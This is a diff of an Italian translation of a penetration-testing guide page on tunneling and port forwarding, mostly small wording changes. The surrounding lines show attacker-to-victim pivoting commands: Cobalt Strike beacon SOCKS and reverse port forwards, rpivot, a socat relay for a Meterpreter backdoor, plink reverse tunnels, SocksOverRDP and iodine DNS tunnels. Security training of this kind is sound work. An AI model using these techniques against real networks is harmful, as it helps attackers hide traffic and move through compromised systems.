@@ -1,8 +1,8 @@
-# Tunneling e Port Forwarding
+# Tunneling and Port Forwarding
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Suggerimento Nmap
+## Nmap tip
 
 > [!WARNING]
 > **ICMP** e **SYN** scans non possono essere tunnelizzati attraverso proxy socks, quindi dobbiamo **disabilitare la scoperta ping** (`-Pn`) e specificare **scansioni TCP** (`-sT`) affinché questo funzioni.
@@ -78,7 +78,7 @@ ifconfig tun0 up #Activate the client side network interface
 ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
 ifconfig tun0 up #Activate the server side network interface
 ```
-Abilita l'inoltro lato Server
+Abilita l'inoltro sul lato Server
 ```bash
 echo 1 > /proc/sys/net/ipv4/ip_forward
 iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
@@ -90,7 +90,7 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ## SSHUTTLE
 
 Puoi **tunneling** tramite **ssh** tutto il **traffico** verso una **sottorete** attraverso un host.\
-Ad esempio, inoltrando tutto il traffico diretto a 10.10.10.0/24
+Ad esempio, inoltrando tutto il traffico che va a 10.10.10.0/24
 ```bash
 pip install sshuttle
 sshuttle -r user@host 10.10.10.10/24
@@ -134,7 +134,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 
 ### SOCKS proxy
 
-Apri una porta nel teamserver in ascolto su tutte le interfacce che possono essere utilizzate per **instradare il traffico attraverso il beacon**.
+Apri una porta nel teamserver in ascolto su tutte le interfacce che può essere utilizzata per **instradare il traffico attraverso il beacon**.
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -152,8 +152,8 @@ rportfwd stop [bind port]
 ```
 Da notare:
 
-- Il reverse port forward di Beacon è progettato per **tunnellare il traffico verso il Team Server, non per il relay tra macchine individuali**.
-- Il traffico è **tunnellato all'interno del traffico C2 di Beacon**, inclusi i link P2P.
+- Il reverse port forward di Beacon è progettato per **tunnelare il traffico verso il Team Server, non per il relay tra macchine individuali**.
+- Il traffico è **tunnelato all'interno del traffico C2 di Beacon**, inclusi i link P2P.
 - **I privilegi di amministratore non sono richiesti** per creare reverse port forwards su porte alte.
 
 ### rPort2Port locale
@@ -227,7 +227,7 @@ listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
 # Display the currently running listeners on the agent -- Attacker
 listener_list
 ```
-### Accesso alle porte locali dell'agente
+### Accedi alle porte locali dell'agente
 ```bash
 # Establish a tunnel from the proxy server to the agent
 # Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
@@ -237,7 +237,7 @@ interface_add_route --name "ligolo" --route 240.0.0.1/32
 
 [https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)
 
-Tunnel inverso. Il tunnel è avviato dalla vittima.\
+Tunnel inverso. Il tunnel viene avviato dalla vittima.\
 Viene creato un proxy socks4 su 127.0.0.1:1080
 ```bash
 attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
@@ -276,7 +276,7 @@ socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
 ```bash
 socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
 ```
-### Meterpreter tramite SSL Socat
+### Meterpreter attraverso SSL Socat
 ```bash
 #Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
 attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
@@ -320,7 +320,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 
 È come una versione console di PuTTY (le opzioni sono molto simili a quelle di un client ssh).
 
-Poiché questo binario verrà eseguito nella vittima ed è un client ssh, dobbiamo aprire il nostro servizio e la nostra porta ssh in modo da poter avere una connessione inversa. Quindi, per inoltrare solo una porta accessibile localmente a una porta nella nostra macchina:
+Poiché questo binario verrà eseguito nella vittima ed è un client ssh, dobbiamo aprire il nostro servizio ssh e la porta in modo da poter avere una connessione inversa. Quindi, per inoltrare solo una porta accessibile localmente a una porta nella nostra macchina:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -341,7 +341,7 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 ```
 ## SocksOverRDP & Proxifier
 
-È necessario avere **accesso RDP al sistema**.\
+È necessario avere **accesso RDP sul sistema**.\
 Scarica:
 
 1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Questo strumento utilizza `Dynamic Virtual Channels` (`DVC`) dalla funzione Remote Desktop Service di Windows. DVC è responsabile per **il tunneling dei pacchetti sulla connessione RDP**.
@@ -352,9 +352,9 @@ Nel tuo computer client carica **`SocksOverRDP-Plugin.dll`** in questo modo:
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-Ora possiamo **connetterci** alla **vittima** tramite **RDP** usando **`mstsc.exe`**, e dovremmo ricevere un **messaggio** che dice che il **plugin SocksOverRDP è abilitato**, e ascolterà su **127.0.0.1:1080**.
+Ora possiamo **connetterci** alla **vittima** tramite **RDP** utilizzando **`mstsc.exe`**, e dovremmo ricevere un **messaggio** che dice che il **plugin SocksOverRDP è abilitato**, e ascolterà su **127.0.0.1:1080**.
 
-**Connetti** tramite **RDP** e carica ed esegui nella macchina della vittima il binario `SocksOverRDP-Server.exe`:
+**Connetti** tramite **RDP** e carica ed esegui nel computer della vittima il binario `SocksOverRDP-Server.exe`:
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
@@ -362,13 +362,13 @@ Ora, conferma nella tua macchina (attaccante) che la porta 1080 è in ascolto:
 ```
 netstat -antb | findstr 1080
 ```
-Ora puoi usare [**Proxifier**](https://www.proxifier.com/) **per fare il proxy del traffico attraverso quella porta.**
+Ora puoi utilizzare [**Proxifier**](https://www.proxifier.com/) **per proxyare il traffico attraverso quella porta.**
 
 ## Proxifica le app GUI di Windows
 
-Puoi fare in modo che le app GUI di Windows navigano attraverso un proxy usando [**Proxifier**](https://www.proxifier.com/).\
+Puoi fare in modo che le app GUI di Windows navigano attraverso un proxy utilizzando [**Proxifier**](https://www.proxifier.com/).\
 In **Profile -> Proxy Servers** aggiungi l'IP e la porta del server SOCKS.\
-In **Profile -> Proxification Rules** aggiungi il nome del programma da proxificare e le connessioni agli IP che vuoi proxificare.
+In **Profile -> Proxification Rules** aggiungi il nome del programma da proxyare e le connessioni agli IP che desideri proxyare.
 
 ## Bypass del proxy NTLM
 
@@ -391,7 +391,7 @@ Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
 Ora, se imposti ad esempio nel bersaglio il servizio **SSH** per ascoltare sulla porta 443. Puoi connetterti ad esso attraverso la porta 2222 dell'attaccante.\
-Potresti anche usare un **meterpreter** che si connette a localhost:443 e l'attaccante sta ascoltando sulla porta 2222.
+Puoi anche utilizzare un **meterpreter** che si connette a localhost:443 e l'attaccante sta ascoltando sulla porta 2222.
 
 ## YARP
 
@@ -403,7 +403,7 @@ Un reverse proxy creato da Microsoft. Puoi trovarlo qui: [https://github.com/mic
 
 [https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)
 
-È necessario avere i permessi di root in entrambi i sistemi per creare adattatori tun e tunnelare i dati tra di essi utilizzando query DNS.
+È necessario avere i privilegi di root in entrambi i sistemi per creare adattatori tun e tunnelare dati tra di essi utilizzando query DNS.
 ```
 attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
@@ -440,7 +440,7 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 ```
 #### Cambiare il DNS di proxychains
 
-Proxychains intercetta la chiamata `gethostbyname` della libc e instrada la richiesta DNS tcp attraverso il proxy socks. Per **default** il server **DNS** che proxychains utilizza è **4.2.2.2** (hardcoded). Per cambiarlo, modifica il file: _/usr/lib/proxychains3/proxyresolv_ e cambia l'IP. Se sei in un **ambiente Windows** potresti impostare l'IP del **domain controller**.
+Proxychains intercetta la chiamata `gethostbyname` della libc e instrada la richiesta DNS tcp attraverso il proxy socks. Per **default** il server **DNS** che proxychains utilizza è **4.2.2.2** (hardcoded). Per cambiarlo, modifica il file: _/usr/lib/proxychains3/proxyresolv_ e cambia l'IP. Se sei in un **ambiente Windows** puoi impostare l'IP del **domain controller**.
 
 ## Tunnel in Go
 
@@ -478,7 +478,7 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ## ngrok
 
 [**ngrok**](https://ngrok.com/) **è uno strumento per esporre soluzioni a Internet con un'unica riga di comando.**\
-&#xNAN;_&#x45;xposition URI sono come:_ **UID.ngrok.io**
+_&#x45;xposition URI sono come:_ **UID.ngrok.io**
 
 ### Installazione
 
